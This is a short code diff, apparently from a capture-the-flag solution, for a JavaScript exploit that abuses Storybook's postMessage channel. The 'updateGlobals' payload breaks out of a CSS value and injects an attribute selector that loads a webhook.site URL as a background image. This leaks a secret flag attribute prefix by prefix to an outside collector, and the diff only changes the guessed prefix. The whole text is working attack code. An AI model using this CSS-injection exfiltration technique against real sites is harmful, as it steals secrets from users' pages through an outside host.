@@ -7,7 +7,7 @@ var a = window.open(
 
 setTimeout(function() {
   a.postMessage(
-    `{"key":"storybook-channel","event":{"source":"preview","type":"updateGlobals","args":[{"globals":{"backgrounds":{"value":"aaa} #secret[data-flag^='flag{t'] { background-image: url('https://webhook.site/5a88cab2-e3cc-485d-92be-a79d71617a3e');"}},"options":{"target":"storybook-preview-iframe"}}]}}`,
+    `{"key":"storybook-channel","event":{"source":"preview","type":"updateGlobals","args":[{"globals":{"backgrounds":{"value":"aaa} #secret[data-flag^='flag{'] { background-image: url('https://webhook.site/5a88cab2-e3cc-485d-92be-a79d71617a3e');"}},"options":{"target":"storybook-preview-iframe"}}]}}`,
     "*"
   );
 }, 1000);
